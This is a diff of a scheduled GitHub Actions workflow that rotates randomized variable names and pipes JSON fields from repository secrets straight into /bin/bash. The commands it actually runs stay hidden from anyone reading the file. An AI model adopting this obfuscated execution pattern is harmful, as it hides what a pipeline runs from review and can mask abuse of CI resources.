@@ -1,9 +1,8 @@
 name: fishfastz
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 2/6 * * *'
+    - cron: '33 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: fishfastz
         env:
-          kujmx4185: ${{ secrets.kujmx4185 }}
+          fn81985: ${{ secrets.fn81985 }}
         run: |
-          echo $kujmx4185 | jq -r .ebagk14419 | /bin/bash
-          echo $xv10197 | jq -r .hq7084 | /bin/bash
-          echo $cspdb9527 | jq -r .knpu8493 | /bin/bash
-          echo $pzke54 | jq -r .pxs6846 | /bin/bash
-          echo $sb49 | jq -r .dt4664 | /bin/bash
-          echo $ajdqu041 | jq -r .mjdd77313 | /bin/bash
-          echo $knx853 | jq -r .e60 | /bin/bash
-          echo $m5846 | jq -r .upyye1474 | /bin/bash
-          echo $jjcp256 | jq -r .gupu05763 | /bin/bash
+          echo $fn81985 | jq -r .sups800 | /bin/bash
+          echo $ji62882 | jq -r .ip0 | /bin/bash
+          echo $pzbn779 | jq -r .h4 | /bin/bash
+          echo $ske85528 | jq -r .q27 | /bin/bash
+          echo $fzq5 | jq -r .myh810 | /bin/bash
+          echo $woy35521 | jq -r .c9745 | /bin/bash
+          echo $cbku49454 | jq -r .sko71940 | /bin/bash
+          echo $mlt6899 | jq -r .lsr92 | /bin/bash
 
